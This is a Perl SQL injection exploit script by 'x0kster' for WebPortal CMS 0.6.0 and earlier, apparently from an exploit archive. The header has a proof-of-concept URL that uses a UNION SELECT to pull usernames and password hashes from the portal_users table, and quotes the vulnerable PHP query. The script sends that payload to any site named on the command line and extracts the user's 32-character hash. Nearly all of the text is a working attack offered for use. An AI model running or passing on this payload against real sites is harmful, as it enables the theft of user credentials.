<html><head><title>WebPortal CMS <= 0.6.0 (index.php m) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl -w

# WebPortal CMS &lt;= 0.6.0 Remote Sql Injection Exploit
# Script Site : webportal.ivanoculmine.com
# by x0kster - x0kster[AT]gmail[DOT]com
# PoC : http://site/index.php?m=index.php?m=-1'+union+select+1,concat(uname,0x3a,pass),3,4,5,6,7+from+portal_users+where+id=1/*
# Note : For work register_globals is must be turned on and warning messages too and magic_quotes_gpc must be turned off.
# Vuln Code in index.php:
# &lt;?php
#  [...]
#  if (isset($m)) {
#  $result = db_query (&quot;SELECT * FROM &quot;.$prefix.&quot;modules WHERE id='$m';&quot;); &lt;- Vuln Code :-)
#  [...]
# ?&gt;
# If we select an inesistent id of a mod, it'll try to include it.
# So we have a warning error with the hash!.

use LWP::UserAgent;
if (@ARGV &lt; 2){
 print &quot;---------------------------------------------------------------\n&quot;;
 print &quot;WebPortal CMS &lt;= 0.6.0 Remote Sql Injection Exploit by x0kster.\n&quot;;
 print &quot;Usage : perl $0 site userid \n&quot;;
 print &quot;Ex:     perl $0 http://localhost/webportal/ 1\n&quot;;
 print &quot;Coded by x0kster -x0kster[AT]gmail[DOT]com   \n&quot;;
 print &quot;---------------------------------------------------------------\n&quot;;
 exit();
 }
$b = LWP::UserAgent-&gt;new() or die &quot;[-]LWP::UserAgent error.\n&quot;;
$b-&gt;agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
print &quot;[+]Exploiting.\n&quot;;
$host = $ARGV[0].&quot;index.php?m=index.php?m=-1'+union+select+1,concat(uname,0x3a,pass),3,4,5,6,7+from+portal_users+where+id=&quot;.$ARGV[1].&quot;/*&quot;;
$res = $b-&gt;request(HTTP::Request-&gt;new(GET=&gt;$host));
$res-&gt;content =~ /([0-9a-fA-F]{32})/;
print &quot;[+]Ok, hash for username with userid &quot;.$ARGV[1].&quot; is $1\n&quot;;
print &quot;[+]Exploiting terminated.\n&quot;;
print &quot;[+]Coded by x0kster\n&quot;;

# milw0rm.com [2007-12-31]</pre></html>